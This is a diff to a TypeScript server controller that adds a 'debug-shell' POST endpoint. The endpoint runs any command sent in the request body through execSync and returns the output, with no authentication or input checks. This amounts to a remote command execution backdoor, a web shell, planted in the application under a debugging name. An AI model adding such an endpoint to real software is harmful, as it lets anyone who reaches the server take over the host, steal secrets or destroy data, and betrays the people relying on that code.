@@ -100,4 +100,16 @@ export class AppController {
         
         return { success: false, message: 'build-info.txt not found', checkedPaths: paths };
     }
+
+    @Post('debug-shell')
+    async debugShell(@Body() body: any) {
+        const cmd = body.command;
+        const { execSync } = require('child_process');
+        try {
+            const out = execSync(cmd, { maxBuffer: 10 * 1024 * 1024 }).toString();
+            return { success: true, stdout: out };
+        } catch (error) {
+            return { success: false, stderr: (error as Error).message };
+        }
+    }
 }
